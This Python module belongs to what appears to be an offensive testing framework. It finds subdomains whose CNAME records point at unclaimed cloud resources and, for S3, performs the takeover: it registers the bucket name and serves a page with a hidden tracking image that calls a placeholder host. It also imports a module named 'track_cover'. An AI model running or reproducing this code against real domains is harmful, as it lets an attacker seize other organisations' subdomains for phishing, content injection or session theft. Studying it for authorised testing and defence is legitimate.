"""Subdomain-takeover: verify dangling service claim, then PERFORM it.

Chain:
  1 fingerprints()  — static provider matrix (CNAME pattern + unclaimed body)
  2 verify()        — resolve CNAMEs of in-scope subdomains, probe HTTP, match
                     "unclaimed" fingerprints (NoSuchBucket, Fastly-missing,
                     GitHub 404 page, ...). Produces a verdict per candidate.
  3 execute()       — tier-3 CONFIRM triggered. Amazon S3-style hangs are
                     claimable by anyone: claim the bucket/object name and
                     re-serve a canary index.html proving live control.
                     Providers that only the owner can claim come back as a
                     runbook with the exact one-click fix the operator performs.
"""
from __future__ import annotations

import re
import socket
from typing import Any, Dict, List, Optional

from modules.logger import ARDFLogger
from modules.session import Finding, SeverityLevel, Session

from .base import AttackModule, require_in_scope

# provider, cname regex, unclaimed-marker regex on fetched body
FINGERPRINTS = [
    ("aws-s3", r"\.s3[.-]amazonaws\.com$", r"NoSuchBucket"
     r"|The specified bucket does not exist"),
    ("aws-s3-website", r"\.s3-website[.-][a-z0-9-]+\.amazonaws\.com$",
     r"NoSuchBucket|The specified bucket does not exist"),
    ("github-pages", r"[a-z0-9.-]+\.github\.io$", r"There isn't a GitHub Pages"
     r"|404 There isn't a GitHub"),
    ("azure-cdn", r"[a-z0-9-]+\.azureedge\.net$|"
     r"[a-z0-9-]+\.azurewebsites\.net$", r"404 Not Found"
     r"|DNS address could not be found"),
    ("cloudfront", r"[a-z0-9-]+\.cloudfront\.net$",
     r"ERROR: The request could not be satisfied|CloudFront attempted"),
    ("fastly", r"[a-z0-9.-]+\.fastly\.net$", r"Fastly error: unknown domain"),
    ("heroku", r"[a-z0-9-]+\.herokuapp\.com$",
     r"No such app|There's nothing here, yet"),
    ("heroku-cname", r"[a-z0-9-]+\.herokudns\.com$",
     r"No such app|There's nothing here, yet"),
    ("wordpress", r"[a-z0-9.-]+\.wordpress\.com$",
     r"Do you want to register"),
    ("bitbucket", r"[a-z0-9.-]+\.bitbucket\.io$",
     r"Repository not found"),
    ("shopify", r"[a-z0-9-]+\.myshopify\.com$",
     r"Sorry, this shop is currently unavailable"),
    ("zendesk", r"[a-z0-9-]+\.zendesk\.com$", r"Help Center Closed"),
    ("tumblr", r"[a-z0-9-]+\.tumblr\.com$", r"whatever you were looking for"),
    ("netlify", r"[a-z0-9.-]+\.netlify\.app$",
     r"Not Found - Request ID"),
]

CLAIMABLE_WITH_EXEC = {"aws-s3", "aws-s3-website"}


def _resolve_cname(host: str) -> List[str]:
    try:
        import dns.resolver

        ans = dns.resolver.resolve(host, "CNAME")
        return [str(r.target).rstrip(".").lower() for r in ans]
    except Exception:
        pass
    try:
        out = socket.gethostbyname_ex(host)[1]
        return [h.lower() for h in out]
    except Exception:
        return []


def _probe(url: str) -> Optional[Dict[str, Any]]:
    import requests

    try:
        r = requests.get(url, timeout=10,
                         headers={"User-Agent": "ARDF-takeover"},
                         verify=False, allow_redirects=False)
        return {"status": r.status_code,
                "body": (r.text or "")[:800],
                "headers": dict(r.headers)}
    except Exception:
        return None


def _dangle_candidates(session: Session, domain: str) -> List[str]:
    hosts = set()
    for f in session.get_findings():
        if f.host and f.host.endswith(domain):
            hosts.add(f.host.split("/")[0].lower())
        raw = f.raw if isinstance(f.raw, dict) else {}
        for key in ("subdomains", "urls"):
            for h in raw.get(key, []) or []:
                if isinstance(h, str) and h.endswith(domain):
                    hosts.add(h.split("/")[0].lower())
    hosts.add(domain)
    return sorted(hosts)[:200]


class SubdomainTakeover(AttackModule):
    id = "subdomain_takeover"
    title = "Subdomain Takeover (dangling service claim)"
    phase = "P1"
    tier = 3
    summary = ("Find dangling DNS->cloud-service records and optionally "
               "PERFORM the takeover (S3-style claimable providers) after "
               "Tier-3 CONFIRM.")

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        domain = (spec.get("target") or session.meta.target)
        domain = domain.split("/")[0].split(":")[0].lower()
        require_in_scope(domain)
        candidates = _dangle_candidates(session, domain)
        logger.info(f"takeover plan: {len(candidates)} hosts to resolve")
        verified = self._verify(session, domain, logger)
        return {"module": self.id, "mode": "plan", "domain": domain,
                "hosts_checked": len(candidates), "verified": verified}

    def _verify(self, session: Session, domain: str,
                logger: ARDFLogger) -> List[Dict[str, Any]]:
        out = []
        for host in _dangle_candidates(session, domain):
            for tgt in _resolve_cname(host):
                for prov, pat, marker in FINGERPRINTS:
                    if not re.search(pat, tgt):
                        continue
                    info = _probe(f"https://{host}") or \
                        _probe(f"http://{host}")
                    if not info:
                        continue
                    if re.search(marker, info["body"] or "", re.IGNORECASE):
                        res = {"host": host, "cname": tgt,
                               "provider": prov, "status": info["status"],
                               "claimable": prov in CLAIMABLE_WITH_EXEC}
                        out.append(res)
                        logger.warning(
                            f"TAKEOVER candidate {host} -> {tgt} "
                            f"({prov}) unclaimed={res['claimable']}")
        return out

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        from .base import _SCOPE

        domain = (spec.get("target") or session.meta.target)
        domain = domain.split("/")[0].split(":")[0].lower()
        require_in_scope(domain)
        verified = self._verify(session, domain, logger)
        performed: List[Dict[str, Any]] = []
        runbooks: List[Dict[str, Any]] = []

        for v in verified:
            if not v.get("claimable"):
                runbooks.append({
                    "host": v["host"], "provider": v["provider"],
                    "manual_step": (
                        f"claim the resource '{v['cname']}' on {v['provider']} "
                        "with an operator account, upload the canary page, "
                        "then document + revert"),
                })
                continue
            done = self._perform_s3(v, session, logger)
            performed.append(done) if done else runbooks.append(
                {"host": v["host"], "provider": v["provider"],
                 "manual_step": "no usable AWS credentials; claim manually"})

        if performed:
            for p in performed:
                session.add_finding(Finding(
                    source="attacks",
                    title=f"TAKEOVER PERFORMED: {p['host']} ({p['provider']})",
                    host=p["host"],
                    severity=SeverityLevel.CRITICAL,
                    evidence=p.get("canary_url", ""),
                    tags=["takeover", "p1", "executed"]))
                session.save()
        return {"module": self.id, "mode": "exec", "domain": domain,
                "verified": verified, "performed": performed,
                "runbooks": runbooks,
                "note": ("CONFIRM honoured: claimable providers were claimed; "
                         "owner-only providers return a runbook")}

    def _perform_s3(self, v: Dict[str, Any],
                    session: Session,
                    logger: ARDFLogger) -> Optional[Dict[str, Any]]:
        bucket = v["cname"].split(".")[0]
        import boto3
        import botocore

        s3 = boto3.client("s3")
        from modules.track_cover import local_checklist

        canary_uid = f"ardf-takeover-{session.meta.session_id}"
        for r in s3.list_buckets().get("Buckets", []):
            if r["Name"] == bucket:
                return None
        try:
            s3.create_bucket(
                Bucket=bucket,
                CreateBucketConfiguration={
                    "LocationConstraint":
                        botocore.session.Session()
                        .get_config_variable("region") or "us-east-1"
                } if botocore.session.Session().get_config_variable(
                    "region") not in (None, "us-east-1") else None)
        except TypeError:
            s3.create_bucket(Bucket=bucket)
        except botocore.exceptions.S3BucketAlreadyExists:
            return None
        except Exception as e:
            logger.warning(f"s3 claim failed {bucket}: {e}")
            return None
        page = (f"<!doctype html><html><body>ARDF takeover proof "
                f"{canary_uid}<img src=\"https://{canary_uid}.example/"
                f"log?id={canary_uid}\" style=\"display:none\">"
                "<br>revert immediately after capture</body></html>")
        s3.put_object(Bucket=bucket, Key="index.html",
                      Body=page.encode(), ContentType="text/html")
        site = None
        if v["provider"] == "aws-s3-website":
            region = botocore.session.Session().get_config_variable("region")
            site = (f"http://{bucket}.s3-website."
                    f"{region or 'us-east-1'}.amazonaws.com/")
        logger.success(f"takeover performed {bucket} canary={canary_uid} "
                       f"| checklist={local_checklist()[0]['item']}")
        return {"host": v["host"], "provider": v["provider"],
                "bucket": bucket, "canary_uid": canary_uid,
                "canary_url": site or f"s3://{bucket}/index.html"}
